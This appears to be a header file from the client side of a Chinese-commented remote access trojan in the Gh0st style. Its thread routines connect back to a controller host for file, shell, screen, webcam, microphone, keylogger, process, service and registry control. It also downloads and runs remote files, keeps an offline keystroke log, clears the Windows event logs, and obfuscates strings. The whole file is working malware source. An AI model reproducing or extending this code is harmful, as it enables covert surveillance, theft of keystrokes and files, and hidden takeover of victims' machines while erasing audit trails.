#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "KernelManager.h"
#include "FileManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"
#include "VideoManager.h"
#include "AudioManager.h"
#include "SystemManager.h"
#include "KeyboardManager.h"
#include "ServerManager.h"
#include "RegManager.h"
#include "..\StrCry.h"
#include "until.h"
#include "install.h"
#include <wininet.h>

extern bool g_bSignalHook;

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	//---声明套接字类
	CClientSocket	socketClient;
	//连接
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;  //错误就返回
	//---定义文件管理类  这个类也重载了 CManager 也就是说他的数据接收后就会调用 CFileManager::OnReceive
	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();            //---等待线程结束

	return 0;
}

DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CShellManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CScreenManager	manager(&socketClient);

	socketClient.run_event_loop();
	return 0;
}

// 摄像头不同一线程调用sendDIB的问题
DWORD WINAPI Loop_VideoManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CVideoManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}


DWORD WINAPI Loop_AudioManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CAudioManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
{
	char	strKeyboardOfflineRecord[MAX_PATH] = {0};
	//GetSystemDirectory(strKeyboardOfflineRecord, sizeof(strKeyboardOfflineRecord));
	lstrcat(strKeyboardOfflineRecord, "C:\\syslog.dat");
	
	if (GetFileAttributes(strKeyboardOfflineRecord) != -1)
		g_bSignalHook = true;
	else
		g_bSignalHook = false;

	while (1)
	{
		while (g_bSignalHook == false)Sleep(100);
		CKeyboardManager::StartHook();
		while (g_bSignalHook == true)Sleep(100);
		CKeyboardManager::StopHook();
	}

	return 0;
}

DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CKeyboardManager	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

//进程遍历回调函数
DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSystemManager	manager(&socketClient, COMMAND_SYSTEM);
	
	socketClient.run_event_loop();

	return 0;
}

//窗口线程回调函数
DWORD WINAPI Loop_WindowManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;

	CSystemManager	manager(&socketClient, COMMAND_WSLIST);

	socketClient.run_event_loop();

	return 0;
}


DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;

	if (!http_get(lpURL, lpFileName))
	{
		return false;
	}

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char c_lpDesktop[] = "WinSta0\\Default";
	si.lpDesktop = TEXT("WinSta0\\Default");
	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	return true;
}


//如果用urldowntofile的话，程序会卡死在这个函数上
bool UpdateServer(LPCTSTR lpURL)
{
	char	*lpFileName = NULL;
	
	lpFileName = (char	*)(strrchr(lpURL, '/') + 1);
	if (lpFileName == NULL)
		return false;
	if (!http_get(lpURL, lpFileName))
		return false;
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;

	//strcry
	char WinSta0[] = { 0x0f,0x9c,0xa3,0xa7,0x9b,0xb3,0xa7,0xf5,0x98,0x87,0xa7,0xa7,0xa1,0xca,0xd2,0xc9 };	//WinSta0\Default
	char* pWinSta0 = decodeStr(WinSta0);							//解密函数

	//si.lpDesktop = "WinSta0\\Default"; 
	si.lpDesktop = pWinSta0;
	bool trueOrFales = CreateProcess(lpFileName, "CcRmt Update", NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	memset(pWinSta0, 0, WinSta0[STR_CRY_LENGTH]);					//填充0
	delete pWinSta0;

	return trueOrFales;
}


bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return false;

	// System 权限下不能直接利用shellexecute来执行

	//Applications\\iexplore.exe\\shell\\open\\command
	char Applications[] = { 0x2c,0x8a,0xba,0xb9,0xa4,0xae,
		0xa5,0xa4,0xb0,0xaa,0xad,0xaf,0xb3,0xe3,0xd7,0xd8,
		0xc4,0xcb,0xd6,0xd6,0xca,0xd2,0x98,0xd0,0xcc,0xd6,
		0xee,0xc2,0xd8,0xca,0xc2,0xc1,0xf0,0xc4,0xda,0xcc,
		0xc6,0xfb,0xc5,0xca,0xc9,0xce,0xc3,0xcf,0xc4 };	
	char* pApplications = decodeStr(Applications);					//解密函数

	
	char	*lpSubKey = pApplications;
	HKEY	hKey;
	char	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	memset(strIEPath, 0, sizeof(strIEPath));
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
	{ 
		memset(pApplications, 0, Applications[STR_CRY_LENGTH]);					//填充0
		delete pApplications;
		return false;
	}
	memset(pApplications, 0, Applications[STR_CRY_LENGTH]);					//填充0
	delete pApplications;


	RegQueryValue(hKey, NULL, strIEPath, &nSize);
	RegCloseKey(hKey);

	if (lstrlen(strIEPath) == 0)
		return false;

	lpstrCat = strstr(strIEPath, "%1");
	if (lpstrCat == NULL)
		return false;

	lstrcpy(lpstrCat, lpszURL);

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;

	//strcry
	char WinSta0[] = { 0x0f,0x9c,0xa3,0xa7,0x9b,0xb3,0xa7,0xf5,0x98,0x87,0xa7,0xa7,0xa1,0xca,0xd2,0xc9 };	//WinSta0\Default
	char* pWinSta0 = decodeStr(WinSta0);							//解密函数


	if (nShowCmd != SW_HIDE)
		si.lpDesktop = pWinSta0;

	CreateProcess(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	memset(pWinSta0, 0, WinSta0[STR_CRY_LENGTH]);					//填充0
	delete pWinSta0;


	return 0;
}

void CleanEvent()
{
	//strcry Application Security System
	char Application[] = { 0x0b,0x8a,0xba,0xb9,0xa4,0xae,0xa5,0xa4,0xb0,0xaa,0xad,0xaf };
	char Security[] = { 0x08,0x98,0xaf,0xaa,0xbd,0xb5,0xaf,0xb1,0xbd };
	char System[] = { 0x98,0xb3,0xba,0xbc,0xa2,0xab };

	char *strEventName[3];
	strEventName	[0] = decodeStr(Application);
	strEventName	[1] = decodeStr(Security);
	strEventName	[2] = decodeStr(System);

	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
	memset(strEventName[0], 0, Application[STR_CRY_LENGTH]);					//填充0
	delete strEventName[0];
	memset(strEventName[1], 0, Security[STR_CRY_LENGTH]);					//填充0
	delete strEventName[1];
	memset(strEventName[2], 0, System[STR_CRY_LENGTH]);					//填充0
	delete strEventName[2];
}

void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));


	//strcry SYSTEM\CurrentControlSet\Services\%s
	char Services[] = { 0x24,0x98,0x93,0x9a,0x9c,0x82,0x8b,
		0x99,0x87,0xb6,0xb0,0xb3,0xa5,0xd1,0xca,0xfe,0xd3,
		0xd5,0xce,0xcb,0xd7,0xdb,0xe5,0xd0,0xc0,0xef,0xe1,
		0xd4,0xc2,0xd9,0xc7,0xce,0xc9,0xd8,0xf6,0x8c,0xdb };	//WinSta0\Default
	char* pServices = decodeStr(Services);							//解密函数

	//wsprintf(strSubKey, "SYSTEM\CurrentControlSet\Services\%s", lpServiceName);
	wsprintf(strSubKey, pServices, lpServiceName);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpHostID, lstrlen(lpHostID), 0);

	memset(pServices, 0, Services[STR_CRY_LENGTH]);					//填充0
	delete pServices;


}


// 服务管理线程
DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)
{
	//OutputDebugString("DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)");
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;

	CServerManager	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}

// 注册表管理
DWORD WINAPI Loop_RegeditManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;

	CRegManager	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}



#endif // !defined(AFX_LOOP_H_INCLUDED)
